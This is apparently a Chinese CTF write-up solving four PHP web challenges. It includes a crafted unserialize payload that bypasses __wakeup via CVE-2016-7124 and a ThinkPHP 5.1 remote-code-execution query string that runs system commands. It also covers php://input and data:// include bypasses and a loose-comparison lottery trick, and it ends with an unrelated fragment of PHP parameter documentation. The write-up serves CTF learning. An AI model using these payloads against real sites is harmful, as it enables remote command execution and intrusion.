    Web_php_unserialize

    题目来源：XTCTF

    这里又是一道反序列化的题
    题目代码

    <?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');
    } else {
        @unserialize($var);
    }
} else {
    highlight_file("index.php");
}
?>

    和之前的那题反序列化类似
    注意这里的参数需要进行bease64编码

    <?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup
    var_dump($C);
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
    var_dump(base64_encode($C));
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
?>

    将base64编码后的序列化后的参数赋给变量var去访问即得flag
    用+4替换成4是为了绕过preg_match的正则表达式。
    同样的把2替换成1是利用了CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。

    php_rce

    题目来源：无

    利用的是ThinkPHP5.1框架下的RCE漏洞，该漏洞可以执行系统命令，漏洞的payload为

    ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=系统命令

    本题的具体payload为：

    ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name flag
    在根目录下查找名为flag的文件
    找到后查看flag
    ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag

    该漏洞具体分析可以看
    https://www.freebuf.com/vuls/200585.html

    Web_php_include

    题目来源：XTCTF

    题目：

    <?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>

    这里有几种不同的解法
    方法一
    str_replace()以其它字符替换字符串中的一些字符(函数区分大小写，这里就是将php://替换为空)
    分析代码strstr()函数的作用是查找字符串首次出现的位子，返回字符串剩余的部分，因为这个函数是区分大小写的所以可以利用PHP://input来绕过，POST传输恶意代码

    方法二
    既然php://伪协议需要绕过，那么我们可以试试其他·的伪协议
    这里还能使用data://伪协议


    代码被成功执行。

    发现system函数可以使用system函数来执行系统命令，找到了fl4gisisish3r3.php，接着就查看即可

    还能利用php://file来读文件

    将base64解码即可得到flag

    lottery
    开始还以为只是前端限制，试过后发现并不是😂
    这题是源码泄露，这里可以直接下载源码
    进行代码审计，发现里面有个api.php，接口文件，一般问题都出在数据交互处，审计它就好了
    发现里面的buy函数里的，没有检查数据类型。我们输入的七位数分别与php随机生成的数逐个比较来判断是否中奖，但是这里使用“==”来作比较，“==”是弱类型的，当数字变为true时，生成的随机数也会转换为布尔来进行比较，数字除0外其它都为真，所以当true==非0数都为真。
    所以利用bp抓包将我们的数改为”numbers”:[true,true,true,true,true,true,true]，即可中很多钱，攒够钱后去buyflag就好了

参数

haystack
在该字符串中进行查找。

needle

offset
如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。
